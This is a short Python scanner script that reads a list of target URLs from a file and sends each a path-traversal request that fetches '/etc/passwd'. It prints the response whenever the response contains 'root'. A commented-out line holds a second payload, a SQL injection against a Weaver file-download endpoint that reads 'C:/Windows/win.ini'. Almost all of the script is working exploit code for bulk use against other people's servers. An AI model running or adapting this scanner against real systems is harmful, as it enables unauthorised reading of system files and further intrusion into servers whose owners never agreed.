import requests

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
    }
def scan(url:str,poc:str):
    url=url+poc
    print(url)
    try:
        r=requests.get(url,headers=headers,timeout=10)
        if "root" in r.text:
            print(r.text)
    except:
        print('not Find')

# poc="/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27"
poc="/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd"

with open("surver.txt","r",encoding="utf-8") as file:
    print(file)
    for url in file:
        print(url)
        if "http://" not in url and "https://" not in url:
            url="http://"+url
        scan(url=url.strip(),poc=poc)